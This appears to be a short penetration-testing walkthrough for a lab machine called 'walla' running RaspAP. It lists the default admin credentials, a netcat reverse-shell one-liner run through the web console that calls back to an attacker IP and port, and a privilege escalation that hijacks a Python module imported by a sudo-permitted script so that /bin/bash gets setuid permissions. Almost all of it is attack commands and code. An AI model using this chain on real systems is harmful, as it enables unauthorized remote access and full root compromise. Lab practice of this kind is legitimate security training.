____

> [!info]
> IP=192.168.213.97


# 8091 - http

RaspAP

Default creds:
- Username: admin.
- Password: secret.

## /includes/webconsole.php
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.204 4444 >/tmp/f
```

# PrivEsc

```bash
sudo -l
User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
```

```python
#!/usr/bin/python
import sys

try:
        import wificontroller
except Exception:
        print "[!] ERROR: Unable to load wificontroller module."
        sys.exit()

wificontroller.stop("wlan0", "1")
wificontroller.reset("wlan0", "1")
wificotroller.start("wlan0", "1")
```

## Library Hijacking
wificontroller.py

```python
import os
os.system("chmod 4777 /bin/bash")
```
